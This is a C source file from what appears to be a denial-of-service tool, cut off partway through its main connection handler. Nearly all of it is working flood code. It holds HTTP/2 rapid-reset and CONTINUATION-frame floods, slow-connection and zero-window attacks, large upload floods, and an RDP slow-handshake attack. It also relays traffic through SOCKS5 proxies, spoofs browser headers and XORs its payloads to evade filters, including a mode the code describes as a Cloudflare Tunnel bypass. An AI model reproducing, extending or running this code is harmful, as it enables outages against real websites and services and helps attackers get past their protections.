#include "attack.h"
#include "network.h"
#include "logger.h"
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/filter.h>
#include <net/if.h>
#include <poll.h>
#include <sys/ioctl.h>

static __thread Connection *active_conns_list = NULL;

void get_mac_address(const char *iface, unsigned char *mac) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return;
    struct ifreq ifr;
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
}

void get_gateway_mac(const char *iface, unsigned char *mac) {
    FILE *fp = fopen("/proc/net/arp", "r");
    if (!fp) { memset(mac, 0xff, 6); return; }
    char line[256];
    char ip[128], hw_type[128], flags[128], hw_addr[128], mask[128], dev[128];
    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "%s %s %s %s %s %s", ip, hw_type, flags, hw_addr, mask, dev) == 6) {
            if (strcmp(dev, iface) == 0 && strcmp(hw_addr, "00:00:00:00:00:00") != 0) {
                unsigned int m[6];
                if (sscanf(hw_addr, "%x:%x:%x:%x:%x:%x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
                    for (int i=0; i<6; i++) mac[i] = (unsigned char)m[i];
                    fclose(fp);
                    return;
                }
            }
        }
    }
    fclose(fp);
    memset(mac, 0xff, 6); // fallback to broadcast
}

static void generate_random_headers(char *headers_out, char *ua_out, const char *host) {
    const char *os_list[] = {
        "Windows NT 10.0; Win64; x64",
        "Macintosh; Intel Mac OS X 10_15_7",
        "X11; Linux x86_64",
        "iPhone; CPU iPhone OS 16_5 like Mac OS X",
        "Linux; Android 13; SM-G991B"
    };
    int os_idx = rand() % 5;
    int chrome_ver = 110 + (rand() % 15);
    snprintf(ua_out, 256, "Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", os_list[os_idx], chrome_ver);
    const char *plat = "Windows";
    if (os_idx == 1) plat = "macOS"; else if (os_idx == 2) plat = "Linux"; else if (os_idx == 3) plat = "iOS"; else if (os_idx == 4) plat = "Android";
    snprintf(headers_out, 1024,
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.9\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "Sec-Ch-Ua: \"Google Chrome\";v=\"%d\", \"Chromium\";v=\"%d\", \"Not-A.Brand\";v=\"24\"\r\n"
        "Sec-Ch-Ua-Mobile: ?0\r\n"
        "Sec-Ch-Ua-Platform: \"%s\"\r\n"
        "Sec-Fetch-Dest: document\r\n"
        "Sec-Fetch-Mode: navigate\r\n"
        "Sec-Fetch-Site: none\r\n"
        "Sec-Fetch-User: ?1\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "Connection: keep-alive\r\n\r\n",
        host, ua_out, chrome_ver, chrome_ver, plat
    );
}

void generate_heavy_payloads() {
    LOG_INFO("Tornado V12: Pre-calculating 64 lethal payload variants...");
    for (int i = 0; i < PAYLOAD_CACHE_COUNT; i++) {
        payload_pool[i] = malloc(STABLE_PAYLOAD_SIZE);
        int mode = i % 5;
        
        if (mode == 0) { 
            char boundary[64];
            snprintf(boundary, 64, "----%08x%08x", rand(), rand());
            int len = snprintf((char*)payload_pool[i], STABLE_PAYLOAD_SIZE,
                "--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"payload.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n", boundary);
            
            for (int j = len; j < STABLE_PAYLOAD_SIZE - 64; j++) payload_pool[i][j] = rand() % 256;
            
        } else if (mode == 1) { 
            memset(payload_pool[i], '{', 100); 
            for (int j = 100; j < STABLE_PAYLOAD_SIZE; j++) payload_pool[i][j] = 'A' + (rand() % 26);
        } else if (mode == 2) { 
            
            for (int j = 0; j < STABLE_PAYLOAD_SIZE; j++) payload_pool[i][j] = (j % 2 == 0) ? 0 : 0xFF;
        } else { 
            for (int j = 0; j < STABLE_PAYLOAD_SIZE; j++) payload_pool[i][j] = rand() % 256;
        }
    }
}



void encrypt_payload(unsigned char *buffer, int len, unsigned char key) {
    for (int i = 0; i < len; i++) {
        buffer[i] ^= key;
        key = (key + 1) % 256;
    }
}

void obfuscate_payload(unsigned char *buffer, int len) {
    for (int i = 0; i < len; i++) {
        buffer[i] = (buffer[i] << 4) | (buffer[i] >> 4);
    }
}

void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id) {
    int raw_fd = -1;
    if (args.is_raw_udp) {
        raw_fd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
        if (raw_fd < 0) {
            LOG_ERR("Raw socket failed");
            return;
        }
    }

    Connection *conn = (Connection *)ev->data.ptr;
    if (!conn) {
        if (raw_fd != -1) close(raw_fd);
        return;
    }
    unsigned char buf[1024];
    int n;
    int force_write = 0;

    if (ev->events & (EPOLLERR | EPOLLHUP)) {
        if (raw_fd != -1) close(raw_fd);
        goto cleanup;
    }

    if (ev->events & EPOLLOUT) {
        conn->writable = 1;
    }

    if (ev->events & EPOLLIN) {
        
        if ((args.is_v15_raw_amp || (args.is_hybrid_v15 && proxy_count > 0 && !conn->is_udp_assoc)) && conn->stage == STAGE_ATTACKING) {
            unsigned char drain[65536];
            int dr;
            while ((dr = recv(conn->fd, drain, sizeof(drain), MSG_DONTWAIT)) > 0) {}
            if (dr == 0) goto cleanup;
            if (dr < 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
            int ret;
            while (1) {
                int s = 16384 + (fast_rand() % 16384);
                int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
                ret = send(conn->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL);
                if (ret <= 0) {
                    if (errno == EAGAIN || errno == EWOULDBLOCK) {
                        conn->writable = 0;
                    }
                    break;
                }
                thread_stats[thread_id].packets++;
                thread_stats[thread_id].tcp_packets++;
                thread_stats[thread_id].bytes += ret;
            }
            if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
            return;
        }

        if (args.is_hybrid_v15 && proxy_count > 0 && conn->is_udp_assoc && conn->stage == STAGE_ATTACKING) {
            unsigned char drain[1024];
            int dr = recv(conn->fd, drain, sizeof(drain), MSG_DONTWAIT);
            if (dr == 0) goto cleanup;
            if (dr < 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
            return;
        }

        if (args.is_v4_nightmare && conn->stage == STAGE_ATTACKING) {
            n = recv(conn->fd, buf, 1, 0); 
            if (n <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
            return;
        }

        
        if (args.is_crash_mode && conn->stage == STAGE_ATTACKING) {
            while(recv(conn->fd, buf, sizeof(buf), MSG_DONTWAIT) > 0);
            return;
        }

        n = recv(conn->fd, buf, sizeof(buf), 0);
        if (n <= 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) return;
            goto cleanup;
        }

        if (conn->stage == STAGE_SOCKS_GREET) {
            if (buf[1] == 0x02) {
                conn->stage = STAGE_SOCKS_AUTH;
                conn->sub_stage = 0;
                int ulen = strlen(conn->proxy->user);
                int plen = strlen(conn->proxy->pass);
                unsigned char abuf[256];
                abuf[0] = 0x01; abuf[1] = ulen;
                memcpy(abuf + 2, conn->proxy->user, ulen);
                abuf[2 + ulen] = plen;
                memcpy(abuf + 3 + ulen, conn->proxy->pass, plen);
                send(conn->fd, abuf, 3 + ulen + plen, MSG_NOSIGNAL);
                conn->sub_stage = 1;
            }
            else if (buf[1] == 0x00) {
                conn->stage = STAGE_SOCKS_CONN;
                conn->sub_stage = 0;
                unsigned char req[512] = {0x05, conn->is_udp_assoc ? 0x03 : 0x01, 0x00};
                int req_len = 3;
                if (conn->is_udp_assoc) {
                    req[req_len++] = 0x01;
                    memset(req + req_len, 0, 6);
                    req_len += 6;
                } else if (is_ipv4(args.host)) {
                    req[req_len++] = 0x01;
                    struct in_addr addr;
                    inet_pton(AF_INET, args.host, &addr);
                    memcpy(req + req_len, &addr.s_addr, 4);
                    req_len += 4;
                    unsigned short p = htons(args.port);
                    memcpy(req + req_len, &p, 2);
                    req_len += 2;
                } else {
                    req[req_len++] = 0x03;
                    int hlen = strlen(args.host);
                    req[req_len++] = hlen;
                    memcpy(req + req_len, args.host, hlen);
                    req_len += hlen;
                    unsigned short p = htons(args.port);
                    memcpy(req + req_len, &p, 2);
                    req_len += 2;
                }
                send(conn->fd, req, req_len, MSG_NOSIGNAL);
                conn->sub_stage = 1;
            }
            else goto cleanup;
        } 
        else if (conn->stage == STAGE_SOCKS_AUTH) {
            if (buf[1] != 0x00) goto cleanup; 
            conn->stage = STAGE_SOCKS_CONN;
            conn->sub_stage = 0;
            unsigned char req[512] = {0x05, conn->is_udp_assoc ? 0x03 : 0x01, 0x00};
            int req_len = 3;
            if (conn->is_udp_assoc) {
                req[req_len++] = 0x01;
                memset(req + req_len, 0, 6);
                req_len += 6;
            } else if (is_ipv4(args.host)) {
                req[req_len++] = 0x01;
                struct in_addr addr;
                inet_pton(AF_INET, args.host, &addr);
                memcpy(req + req_len, &addr.s_addr, 4);
                req_len += 4;
                unsigned short p = htons(args.port);
                memcpy(req + req_len, &p, 2);
                req_len += 2;
            } else {
                req[req_len++] = 0x03;
                int hlen = strlen(args.host);
                req[req_len++] = hlen;
                memcpy(req + req_len, args.host, hlen);
                req_len += hlen;
                unsigned short p = htons(args.port);
                memcpy(req + req_len, &p, 2);
                req_len += 2;
            }
            send(conn->fd, req, req_len, MSG_NOSIGNAL);
            conn->sub_stage = 1;
        }
        else if (conn->stage == STAGE_SOCKS_CONN) {
            if (buf[1] != 0x00) goto cleanup; 
            
            if (conn->proxy) {
                conn->proxy->fail_count = 0;
                conn->proxy->is_dead = 0;
                __sync_fetch_and_add(&conn->proxy->success_count, 1);
            }
            
            if (conn->is_udp_assoc) {
                struct sockaddr_in raddr;
                memset(&raddr, 0, sizeof(raddr));
                raddr.sin_family = AF_INET;
                if (buf[3] == 0x01) {
                    memcpy(&raddr.sin_addr.s_addr, buf + 4, 4);
                    memcpy(&raddr.sin_port, buf + 8, 2);
                } else if (buf[3] == 0x03) {
                    int len = buf[4];
                    char dom[256];
                    memcpy(dom, buf + 5, len);
                    dom[len] = '\0';
                    char ip_buf[64];
                    if (resolve_host(dom, ip_buf) == 0) {
                        inet_pton(AF_INET, ip_buf, &raddr.sin_addr);
                    } else {
                        inet_pton(AF_INET, conn->proxy->host, &raddr.sin_addr);
                    }
                    memcpy(&raddr.sin_port, buf + 5 + len, 2);
                } else {
                    inet_pton(AF_INET, conn->proxy->host, &raddr.sin_addr);
                    raddr.sin_port = htons(conn->proxy->port);
                }
                conn->udp_relay_addr = raddr;
                
                int ufd = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
                if (ufd < 0) goto cleanup;
                int sndbuf = 1048576;
                setsockopt(ufd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
                if (connect(ufd, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
                    close(ufd);
                    goto cleanup;
                }
                conn->client_udp_fd = ufd;
            }
            
            if (args.is_v15_raw_amp || (args.is_hybrid_v15 && !conn->is_udp_assoc)) {
                int sndbuf = 1048576;
                setsockopt(conn->fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
            }
            
            if ((args.is_v5_rapid || args.is_v6_void || args.is_v8_phantom) && args.port == 443) {
                conn->stage = STAGE_TLS_HANDSHAKE;
                conn->ssl = SSL_new(ssl_ctx);
                SSL_set_fd(conn->ssl, conn->fd);
                SSL_set_tlsext_host_name(conn->ssl, args.host);
            } else if (args.is_v20_ws) {
                // v20_ws: always TLS (WSS) for CF Tunnel bypass
                conn->stage = STAGE_TLS_HANDSHAKE;
                conn->ssl = SSL_new(ssl_ctx);
                SSL_set_fd(conn->ssl, conn->fd);
                SSL_set_tlsext_host_name(conn->ssl, args.host);
            } else if (args.is_v5_rapid || args.is_v6_void || args.is_v8_phantom) {
                conn->stage = STAGE_H2_PREFACE;
            } else {
                conn->stage = STAGE_ATTACKING;
                conn->writable = 1;
                thread_stats[thread_id].connect_success++;
            }
            conn->sub_stage = 0;
            ev->events |= EPOLLOUT;
            force_write = 1;
        }
    }

    if ((ev->events & EPOLLOUT) || force_write) {
        if (conn->stage == STAGE_TLS_HANDSHAKE) {
            int ret = SSL_connect(conn->ssl);
            if (ret == 1) {
                if (args.is_v20_ws) {
                    // v20_ws: TLS done → go to ATTACKING for WS upgrade
                    conn->stage = STAGE_ATTACKING;
                    conn->writable = 1;
                    conn->sub_stage = 0;
                    thread_stats[thread_id].connect_success++;
                } else {
                    conn->stage = STAGE_H2_PREFACE;
                    conn->sub_stage = 0;
                }
            } else {
                int err = SSL_get_error(conn->ssl, ret);
                if (err != SSL_ERROR_WANT_READ && err != SSL_ERROR_WANT_WRITE) goto cleanup;
                return;
            }
        }

        if (conn->stage == STAGE_H2_PREFACE) {
            if (conn->sub_stage == 0) {
                const char *preface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
                if (conn->ssl) SSL_write(conn->ssl, preface, 24);
                else send(conn->fd, preface, 24, 0);
                
                
                unsigned char spoofed_h2_settings[] = {
                    0x00, 0x00, 0x18, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 
                    0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 
                    0x00, 0x03, 0x00, 0x00, 0x03, 0xe8, 
                    0x00, 0x04, 0x00, 0x5f, 0x5e, 0x10  
                };
                if (conn->ssl) SSL_write(conn->ssl, spoofed_h2_settings, sizeof(spoofed_h2_settings));
                else send(conn->fd, spoofed_h2_settings, sizeof(spoofed_h2_settings), 0);
                
                unsigned char window_update[] = {
                    0x00, 0x00, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x0f, 0x00, 0x00
                };
                if (conn->ssl) SSL_write(conn->ssl, window_update, sizeof(window_update));
                else send(conn->fd, window_update, sizeof(window_update), 0);
                
                conn->sub_stage = 1;
                conn->stage = STAGE_ATTACKING;
                conn->h2_stream_id = 1;
                thread_stats[thread_id].connect_success++;
            }
        }
        if (conn->stage == STAGE_CONNECTING) {
            if (conn->proxy) {
                unsigned char greet[] = {0x05, 0x02, 0x00, 0x02};
                send(conn->fd, greet, 4, 0);
                conn->stage = STAGE_SOCKS_GREET;
                
                
                int mss = 536 + (rand() % 924); 
                setsockopt(conn->fd, IPPROTO_TCP, TCP_MAXSEG, &mss, sizeof(mss));
            } else {
                if (conn->is_udp_assoc) {
                    int ufd = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
                    if (ufd >= 0) {
                        int sndbuf = 1048576;
                        setsockopt(ufd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
                        struct sockaddr_in raddr;
                        memset(&raddr, 0, sizeof(raddr));
                        raddr.sin_family = AF_INET;
                        raddr.sin_port = htons(conn->target_port);
                        inet_pton(AF_INET, args.target_ip, &raddr.sin_addr);
                        if (connect(ufd, (struct sockaddr *)&raddr, sizeof(raddr)) >= 0) {
                            conn->client_udp_fd = ufd;
                        } else {
                            close(ufd);
                        }
                    }
                }
                conn->stage = STAGE_ATTACKING;
                conn->writable = 1;
                thread_stats[thread_id].connect_success++;
            }
        } 
        
        if (conn->stage == STAGE_SOCKS_AUTH && conn->sub_stage == 0) {
            int ulen = strlen(conn->proxy->user);
            int plen = strlen(conn->proxy->pass);
            buf[0] = 0x01; buf[1] = ulen;
            memcpy(buf + 2, conn->proxy->user, ulen);
            buf[2 + ulen] = plen;
            memcpy(buf + 3 + ulen, conn->proxy->pass, plen);
            send(conn->fd, buf, 3 + ulen + plen, 0);
            conn->sub_stage = 1;
        }
        
        if (conn->stage == STAGE_SOCKS_CONN && conn->sub_stage == 0) {
            unsigned char req[512] = {0x05, conn->is_udp_assoc ? 0x03 : 0x01, 0x00};
            int req_len = 3;
            if (conn->is_udp_assoc) {
                req[req_len++] = 0x01;
                memset(req + req_len, 0, 6);
                req_len += 6;
            } else if (is_ipv4(args.host)) {
                req[req_len++] = 0x01; 
                struct in_addr addr;
                inet_pton(AF_INET, args.host, &addr);
                memcpy(req + req_len, &addr.s_addr, 4);
                req_len += 4;
                unsigned short p = htons(args.port);
                memcpy(req + req_len, &p, 2);
                req_len += 2;
            } else {
                req[req_len++] = 0x03; 
                int hlen = strlen(args.host);
                req[req_len++] = hlen;
                memcpy(req + req_len, args.host, hlen);
                req_len += hlen;
                unsigned short p = htons(args.port);
                memcpy(req + req_len, &p, 2);
                req_len += 2;
            }
            send(conn->fd, req, req_len, 0);
            conn->sub_stage = 1;
        }

        if (conn->stage == STAGE_ATTACKING) {
            long long now = get_ms();
            
            
            if (args.is_v8_phantom) {
                if (conn->sub_stage == 0) {
                    
                    unsigned char h2_packet[256];
                    int pos = 0;
                    unsigned char headers_payload[] = {0x82, 0x86, 0x84, 0x41, 0x8c, 0xf1}; 
                    int h_len = sizeof(headers_payload);
                    
                    h2_packet[pos++] = (h_len >> 16) & 0xFF;
                    h2_packet[pos++] = (h_len >> 8) & 0xFF;
                    h2_packet[pos++] = h_len & 0xFF;
                    h2_packet[pos++] = 0x01; 
                    h2_packet[pos++] = 0x00; 
                    h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
                    h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
                    h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
                    h2_packet[pos++] = conn->h2_stream_id & 0xFF;
                    memcpy(h2_packet + pos, headers_payload, h_len);
                    pos += h_len;
                    
                    if (conn->ssl) SSL_write(conn->ssl, h2_packet, pos);
                    else send(conn->fd, h2_packet, pos, MSG_NOSIGNAL);
                    
                    conn->sub_stage = 1;
                    conn->last_pulse_ms = now;
                    
                    conn->thread_id = 10 + (rand() % 40); 
                } else {
                    
                    if (now - conn->last_pulse_ms >= conn->thread_id) {
                        unsigned char h2_packet[4096];
                        int pos = 0;
                        
                        
                        
                        for (int i = 0; i < 30; i++) {
                            unsigned char cont_payload[] = {0xde, 0xad, 0xbe, 0xef}; 
                            int h_len = sizeof(cont_payload);
                            
                            h2_packet[pos++] = (h_len >> 16) & 0xFF;
                            h2_packet[pos++] = (h_len >> 8) & 0xFF;
                            h2_packet[pos++] = h_len & 0xFF;
                            h2_packet[pos++] = 0x09; 
                            h2_packet[pos++] = 0x00; 
                            h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
                            h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
                            h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
                            h2_packet[pos++] = conn->h2_stream_id & 0xFF;
                            memcpy(h2_packet + pos, cont_payload, h_len);
                            pos += h_len;
                        }
                        
                        if (conn->ssl) SSL_write(conn->ssl, h2_packet, pos);
                        else send(conn->fd, h2_packet, pos, MSG_NOSIGNAL);
                        
                        thread_stats[thread_id].packets += 30; 
                        conn->last_pulse_ms = now;
                        conn->thread_id = 5 + (rand() % 20); 
                    }
                }
            }
            
            else if (args.is_v6_void) {
                if (conn->sub_stage == 0) {
                    
                    unsigned char h2_packet[128];
                    int pos = 0;
                    unsigned char headers_payload[] = {0x82, 0x86, 0x84, 0x41, 0x8c, 0xf1}; 
                    int h_len = sizeof(headers_payload);
                    
                    h2_packet[pos++] = (h_len >> 16) & 0xFF;
                    h2_packet[pos++] = (h_len >> 8) & 0xFF;
                    h2_packet[pos++] = h_len & 0xFF;
                    h2_packet[pos++] = 0x01; 
                    h2_packet[pos++] = 0x00; 
                    h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
                    h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
                    h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
                    h2_packet[pos++] = conn->h2_stream_id & 0xFF;
                    memcpy(h2_packet + pos, headers_payload, h_len);
                    pos += h_len;
                    
                    if (conn->ssl) SSL_write(conn->ssl, h2_packet, pos);
                    else send(conn->fd, h2_packet, pos, MSG_NOSIGNAL);
                    
                    conn->sub_stage = 1; 
                    conn->last_pulse_ms = now;
                } else {
                    if (now - conn->last_pulse_ms >= 1) { 
                        unsigned char h2_packet[8192];
                        int pos = 0;
                        
                        
                        for (int i = 0; i < 200; i++) {
                            unsigned char cont_payload[] = {0xaa, 0xbb, 0xcc, 0xdd}; 
                            int h_len = sizeof(cont_payload);
                            
                            h2_packet[pos++] = (h_len >> 16) & 0xFF;
                            h2_packet[pos++] = (h_len >> 8) & 0xFF;
                            h2_packet[pos++] = h_len & 0xFF;
                            h2_packet[pos++] = 0x09; 
                            h2_packet[pos++] = 0x00; 
                            h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
                            h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
                            h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
                            h2_packet[pos++] = conn->h2_stream_id & 0xFF;
                            memcpy(h2_packet + pos, cont_payload, h_len);
                            pos += h_len;
                        }
                        
                        if (conn->ssl) SSL_write(conn->ssl, h2_packet, pos);
                        else send(conn->fd, h2_packet, pos, MSG_NOSIGNAL);
                        
                        thread_stats[thread_id].packets += 200;
                        conn->last_pulse_ms = now;
                    }
                }
            }
            
            else if (args.is_v5_rapid) {
                if (now - conn->last_pulse_ms >= 5) {
                    
                    unsigned char h2_packet[8192];
                    int pos = 0;
                    
                    for (int i = 0; i < 50; i++) { 
                        
                        
                        unsigned char headers_payload[] = {0x82, 0x86, 0x84, 0x41, 0x8c, 0xf1, 0xe3, 0xc2, 0xe5, 0xf2, 0x3a, 0x6b, 0xa0, 0xab, 0x90, 0xf4, 0xff};
                        int h_len = sizeof(headers_payload);
                        
                        h2_packet[pos++] = (h_len >> 16) & 0xFF;
                        h2_packet[pos++] = (h_len >> 8) & 0xFF;
                        h2_packet[pos++] = h_len & 0xFF;
                        h2_packet[pos++] = 0x01; 
                        h2_packet[pos++] = 0x04; 
                        h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
                        h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
                        h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
                        h2_packet[pos++] = conn->h2_stream_id & 0xFF;
                        memcpy(h2_packet + pos, headers_payload, h_len);
                        pos += h_len;

                        
                        h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x04; 
                        h2_packet[pos++] = 0x03; 
                        h2_packet[pos++] = 0x00;
                        h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
                        h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
                        h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
                        h2_packet[pos++] = conn->h2_stream_id & 0xFF;
                        h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x08; 
                        pos += 4;

                        conn->h2_stream_id += 2;
                        if (conn->h2_stream_id > 0x7FFFFFFF) conn->h2_stream_id = 1;
                        if (pos > 7800) break;
                    }

                    if (conn->ssl) SSL_write(conn->ssl, h2_packet, pos);
                    else send(conn->fd, h2_packet, pos, MSG_NOSIGNAL);
                    
                    thread_stats[thread_id].packets += 100;
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_v4_nightmare) {
                if (conn->sub_stage == 0) {
                    char init_payload[] = "GET / HTTP/1.1\r\nHost: \r\n\r\n";
                    send(conn->fd, init_payload, sizeof(init_payload)-1, MSG_NOSIGNAL);
                    conn->sub_stage = 1;
                    conn->last_pulse_ms = now;
                } else if (now - conn->last_pulse_ms >= 2) { 
                    
                    
                    
                    int overlap_size = 12 + (rand() % 8);
                    
                    
                    send(conn->fd, global_buffer_pool + (rand() % 1024), overlap_size, MSG_OOB | MSG_NOSIGNAL);
                    
                    
                    send(conn->fd, global_buffer_pool + (rand() % 1024), overlap_size * 2, MSG_NOSIGNAL);
                    
                    thread_stats[thread_id].packets += 2;
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_v3_killer) {
                if (conn->sub_stage == 0) {
                    
                    char init_payload[] = "GET / HTTP/1.1\r\nHost: \r\n\r\n";
                    send(conn->fd, init_payload, sizeof(init_payload)-1, MSG_NOSIGNAL);
                    
                    
                    int zero = 0;
                    setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &zero, sizeof(zero));
                    
                    conn->sub_stage = 1;
                    conn->last_pulse_ms = now;
                } else {
                    
                    
                    if (now - conn->last_pulse_ms >= 10) {
                        send(conn->fd, "V", 1, MSG_NOSIGNAL);
                        thread_stats[thread_id].packets++;
                        conn->last_pulse_ms = now;
                    }
                }
            } 
            
            else if (args.is_v9_hydra) {
                if (conn->sub_stage == 0) {
                    
                    int window_size = (rand() % 2 == 0) ? 0 : 65535;
                    setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &window_size, sizeof(window_size));
                    
                    
                    send(conn->fd, "X", 1, MSG_NOSIGNAL);
                    conn->sub_stage = 1;
                    conn->last_pulse_ms = now;
                } else if (now - conn->last_pulse_ms >= 10) {
                    
                    
                    int flags = (rand() % 3 == 0) ? (MSG_OOB | MSG_NOSIGNAL) : MSG_NOSIGNAL;
                    
                    
                    char sack_trigger[16];
                    for(int i=0; i<16; i++) sack_trigger[i] = rand() % 255;
                    
                    send(conn->fd, sack_trigger, sizeof(sack_trigger), flags);
                    
                    
                    int window_size = (rand() % 2 == 0) ? 0 : (1024 + rand() % 8192);
                    setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &window_size, sizeof(window_size));
                    
                    thread_stats[thread_id].packets++;
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_v10_persist) {
                if (conn->sub_stage == 0) {
                    
                    int win = (rand() % 2 == 0) ? 0 : 65535;
                    setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &win, sizeof(win));
                    
                    send(conn->fd, "P", 1, MSG_NOSIGNAL);
                    conn->sub_stage = 1;
                    conn->last_pulse_ms = now;
                    
                    conn->keepalive_interval_ms = 15000 + (rand() % 15001);
                } else if (now - conn->last_pulse_ms >= conn->keepalive_interval_ms) {
                    
                    int flags = MSG_NOSIGNAL;
                    int r = rand() % 4;
                    if (r == 0) flags |= MSG_OOB;          
                    else if (r == 1) flags |= MSG_DONTWAIT; 
                    
                    send(conn->fd, "P", 1, flags);
                    
                    int win = (rand() % 2 == 0) ? 0 : (1024 + rand() % 8192);
                    setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &win, sizeof(win));
                    
                    thread_stats[thread_id].packets++;
                    conn->last_pulse_ms = now;
                    conn->keepalive_interval_ms = 15000 + (rand() % 15001);
                }
            }
            
            else if (args.is_v12_eclipse) {
                if (now - conn->last_pulse_ms >= 30 + conn->jitter_ms) { 
                    unsigned char *payload = payload_pool[conn->payload_idx % PAYLOAD_CACHE_COUNT];
                    conn->payload_idx++;
                    
                    
                    char pipe_head[512];
                    int h_len = snprintf(pipe_head, 512, 
                        "POST /uploads/%d HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "Content-Length: %d\r\n"
                        "Connection: keep-alive\r\n\r\n", 
                        rand(), args.host, STABLE_PAYLOAD_SIZE);
                    
                    if (conn->ssl) {
                        SSL_write(conn->ssl, pipe_head, h_len);
                        SSL_write(conn->ssl, payload, STABLE_PAYLOAD_SIZE);
                    } else {
                        send(conn->fd, pipe_head, h_len, MSG_NOSIGNAL);
                        send(conn->fd, payload, STABLE_PAYLOAD_SIZE, MSG_NOSIGNAL);
                    }
                    
                    thread_stats[thread_id].packets += 2;
                    thread_stats[thread_id].bytes += (h_len + STABLE_PAYLOAD_SIZE);
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_v13_shadow) {
                if (now - conn->last_pulse_ms >= 50 + conn->jitter_ms) {
                    BypassPattern *bp = &bypass_patterns[rand() % bypass_patterns_count];
                    unsigned char packet[1500];
                    memcpy(packet, bp->pattern, bp->length);
                    
                    for(int j=bp->length; j<1400; j++) packet[j] = rand() % 256;
                    
                    
                    encrypt_payload(packet, 1400, rand() % 256);
                    obfuscate_payload(packet, 1400);
                    
                    send(conn->fd, packet, 1400, MSG_NOSIGNAL);
                    thread_stats[thread_id].packets++;
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_v14_phantom) {
                if (now - conn->last_pulse_ms >= 50 + conn->jitter_ms) { 
                    if (conn->sub_stage < 19) {
                        
                        
                        unsigned char rdp_cr[] = {
                            0x03, 0x00, 0x00, 0x13, 0x0e, 0xe0, 0x00, 0x00, 
                            0x00, 0x00, 0x00, 0x01, 0x00, 0x08, 0x00, 0x03, 
                            0x00, 0x00, 0x00
                        };
                        send(conn->fd, &rdp_cr[conn->sub_stage], 1, MSG_NOSIGNAL);
                        conn->sub_stage++;
                        conn->last_pulse_ms = now;
                    } 
                    else if (conn->sub_stage == 19) {
                        
                        
                        int win = 0;
                        setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &win, sizeof(win));
                        
                        
                        for (int i = 0; i < 5; i++) {
                            unsigned char poison = rand() % 256;
                            send(conn->fd, &poison, 1, MSG_OOB | MSG_NOSIGNAL);
                        }
                        
                        conn->sub_stage = 20;
                        conn->last_pulse_ms = now;
                    } 
                    else {
                        
                        if (now - conn->last_pulse_ms >= 20000) {
                            goto cleanup; 
                        }
                        
